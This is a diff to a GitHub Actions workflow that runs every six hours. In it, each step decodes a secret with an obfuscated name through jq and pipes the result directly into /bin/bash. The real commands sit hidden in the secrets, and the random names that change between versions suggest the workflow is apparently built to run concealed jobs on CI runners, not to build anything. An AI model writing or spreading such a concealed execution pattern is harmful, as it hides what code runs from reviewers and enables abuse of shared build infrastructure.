@@ -2,27 +2,24 @@ name: zhaoqingyun3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 0/6 * * *'
-jobs:  # 28719
+    - cron: '46 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaoqingyun3456
         env:
-          s5210: ${{ secrets.s5210 }}
+          ug49: ${{ secrets.ug49 }}
         run: |
-          echo $s5210 | jq -r .jtv6 | /bin/bash
-          echo $r91133 | jq -r .qbqsg99146 | /bin/bash
-          echo $qf2 | jq -r .oaoub4 | /bin/bash
-          echo $tcrzd69 | jq -r .iwkxw7 | /bin/bash
-          echo $gop90730 | jq -r .j5418 | /bin/bash
-          echo $lx0 | jq -r .isg44 | /bin/bash
-          echo $s7 | jq -r .jbb5023 | /bin/bash
-          echo $lmdtb4015 | jq -r .byk2596 | /bin/bash
-          echo $py061 | jq -r .kx760 | /bin/bash
-          echo $ssvox3 | jq -r .c1006 | /bin/bash
-          echo $cp1179 | jq -r .nxxw8 | /bin/bash
-          echo $rr9 | jq -r .pso5480 | /bin/bash
-          echo $p0 | jq -r .ldpe68 | /bin/bash
+          echo $ug49 | jq -r .tp2 | /bin/bash
+          echo $kuhj512 | jq -r .z61 | /bin/bash
+          echo $bjetn86962 | jq -r .bvdp73 | /bin/bash
+          echo $uqrg79563 | jq -r .e75785 | /bin/bash
+          echo $ag48 | jq -r .lvk4 | /bin/bash
+          echo $rvx4 | jq -r .okqwj708 | /bin/bash
+          echo $m56940 | jq -r .lsq410 | /bin/bash
+          echo $nn3 | jq -r .hkoj2 | /bin/bash
 
